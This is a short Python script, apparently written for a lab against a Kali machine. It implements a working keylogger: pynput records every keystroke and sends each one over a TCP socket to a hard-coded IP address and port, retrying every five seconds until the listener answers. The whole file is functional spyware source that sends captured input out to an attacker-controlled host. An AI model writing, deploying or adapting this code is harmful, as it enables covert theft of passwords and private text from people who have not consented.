import socket
from pynput import keyboard
import time

SERVER_IP = '192.168.228.128'  # Replace with your Kali IP
SERVER_PORT = 9999

def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            print("[*] Connected to server.")
            return s
        except socket.error:
            print("[!] Server not available, retrying in 5 seconds...")
            time.sleep(5)

def on_press(key):
    try:
        message = key.char  # Alphabet, numbers, etc.
    except AttributeError:
        message = str(key)  # Special keys like space, enter

    try:
        s.sendall(message.encode('utf-8'))
    except:
        pass  # If connection fails, ignore for now

# Connect to server
s = connect_to_server()

# Start keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
